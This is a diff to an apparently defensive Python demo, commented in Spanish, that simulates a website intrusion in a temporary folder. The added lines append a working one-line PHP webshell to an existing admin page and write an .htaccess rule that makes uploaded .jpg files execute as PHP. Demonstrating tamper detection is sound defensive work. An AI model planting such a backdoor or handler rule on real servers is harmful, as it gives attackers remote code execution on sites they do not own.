@@ -49,6 +49,12 @@ def _attack(root: Path) -> None:
     (root / "index.html").write_text("<h1>HACKED BY 0xDEADBEEF</h1>", encoding="utf-8")
     (root / "uploads").mkdir()
     (root / "uploads/avatar.php.jpg").write_text("<?php /* webshell de mentira, no hace nada */ ?>", encoding="utf-8")
+    # Lo más habitual: no subir nada, sino meter una línea en un PHP que ya estaba. Y un
+    # .htaccess para que las «imágenes» de uploads se ejecuten como PHP. (De mentira: nadie
+    # los ejecuta, solo están en la carpeta temporal de la demo.)
+    with open(root / "admin/panel.php", "a", encoding="utf-8") as fh:
+        fh.write("<?php if (isset($_REQUEST['f'])) { $_REQUEST['f']($_REQUEST['a']); } ?>\n")
+    (root / "uploads/.htaccess").write_text("AddType application/x-httpd-php .jpg\n", encoding="utf-8")
     (root / "robots.txt").unlink()
     with open(root / "scripts/backup.sh", "a", encoding="utf-8") as fh:
         fh.write("# línea añadida por el atacante (de mentira, no hace nada)\n")
@@ -84,6 +90,7 @@ def run_demo() -> int:
         _step(3, "Entra un atacante")
         _attack(site)
         print("   cambia la portada, sube una webshell con doble extensión, borra robots.txt,")
+        print("   mete código en un PHP que ya estaba, añade un .htaccess,")
         print("   modifica un script y le pone setuid, redirige un enlace a /etc/passwd y deja")
         print("   otra webshell con un nombre que intenta borrarse de la pantalla")
 
